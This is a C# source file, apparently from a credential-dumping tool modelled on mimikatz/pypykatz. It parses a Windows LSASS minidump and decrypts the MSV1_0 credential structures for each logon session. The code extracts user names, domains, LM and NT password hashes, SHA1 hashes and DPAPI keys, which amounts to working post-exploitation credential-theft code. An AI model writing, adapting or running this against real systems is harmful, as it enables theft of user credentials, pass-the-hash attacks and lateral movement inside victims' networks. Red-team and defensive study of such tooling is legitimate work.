using Minidump.Crypto;
using Minidump.Templates;
using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    public class Msv1_
    {
        public const int LM_NTLM_HASH_LENGTH = 16;
        public const int SHA_DIGEST_LENGTH = 20;

        public static int FindCredentials(Program.MiniDump minidump, msv.MsvTemplate template)
        {
            //PrintProperties(template);

            foreach (var logon in minidump.logonlist)
            {
                var lsasscred = logon.pCredentials;
                var luid = logon.LogonId;

                if (lsasscred > 0)
                {
                    var msventry = new Msv();

                    KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;

                    while (lsasscred != 0)
                    {
                        minidump.fileBinaryReader.BaseStream.Seek(lsasscred, 0);
                        byte[] credentialsBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(KIWI_MSV1_0_CREDENTIALS)));

                        if (credentialsBytes.Length <= 0)
                            break;

                        var pPrimaryCredentials = BitConverter.ToInt64(credentialsBytes, FieldOffset<KIWI_MSV1_0_CREDENTIALS>("PrimaryCredentials"));
                        var pNext = BitConverter.ToInt64(credentialsBytes, FieldOffset<KIWI_MSV1_0_CREDENTIALS>("next"));

                        lsasscred = Rva2offset(minidump, pPrimaryCredentials);
                        while (lsasscred != 0)
                        {
                            minidump.fileBinaryReader.BaseStream.Seek(lsasscred, 0);
                            byte[] primaryCredentialsBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)));

                            primaryCredentials = ReadStruct<KIWI_MSV1_0_PRIMARY_CREDENTIALS>(primaryCredentialsBytes);
                            primaryCredentials.Credentials = ExtractUnicodeString(minidump.fileBinaryReader, lsasscred + template.MSV1CredentialsOffset);
                            primaryCredentials.Primary = ExtractUnicodeString(minidump.fileBinaryReader, lsasscred + template.MSV1PrimaryOffset);

                            if (ExtractANSIStringString(minidump, primaryCredentials.Primary).Equals("Primary"))
                            {
                                minidump.fileBinaryReader.BaseStream.Seek(Rva2offset(minidump, primaryCredentials.Credentials.Buffer), 0);
                                byte[] msvCredentialsBytes = minidump.fileBinaryReader.ReadBytes(primaryCredentials.Credentials.MaximumLength);

                                var msvDecryptedCredentialsBytes = BCrypt.DecryptCredentials(msvCredentialsBytes, minidump.lsakeys);

                                var usLogonDomainName = ReadStruct<UNICODE_STRING>(GetBytes(msvDecryptedCredentialsBytes, template.LogonDomainNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
                                var usUserName = ReadStruct<UNICODE_STRING>(GetBytes(msvDecryptedCredentialsBytes, template.UserNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));

                                msventry = new Msv();
                                msventry.DomainName = Encoding.Unicode.GetString(GetBytes(msvDecryptedCredentialsBytes, usLogonDomainName.Buffer, usLogonDomainName.Length));
                                msventry.UserName = "  " + Encoding.Unicode.GetString(GetBytes(msvDecryptedCredentialsBytes, usUserName.Buffer, usUserName.Length));

                                string lmhash = PrintHashBytes(GetBytes(msvDecryptedCredentialsBytes, template.LmOwfPasswordOffset, LM_NTLM_HASH_LENGTH));
                                if (lmhash != "00000000000000000000000000000000")
                                    msventry.Lm = "     " + lmhash;
                                msventry.NT = "     " + PrintHashBytes(GetBytes(msvDecryptedCredentialsBytes, template.NtOwfPasswordOffset, LM_NTLM_HASH_LENGTH));
                                msventry.Sha1 = "   " + PrintHashBytes(GetBytes(msvDecryptedCredentialsBytes, template.ShaOwPasswordOffset, SHA_DIGEST_LENGTH));
                                string dpapi = PrintHashBytes(GetBytes(msvDecryptedCredentialsBytes, template.DPAPIProtectedOffset, LM_NTLM_HASH_LENGTH));
                                if (dpapi != "00000000000000000000000000000000" && dpapi != "0c000e00000000005800000000000000")
                                    msventry.Dpapi = "  " + dpapi;

                                var currentlogon = minidump.logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                                if (currentlogon == null)
                                    Console.WriteLine("[x] Something goes wrong");
                                else
                                    currentlogon.Msv = msventry;
                            }

                            lsasscred = primaryCredentials.next;
                        }

                        lsasscred = pNext;
                    }
                }
            }

            return 0;
        }
    }
}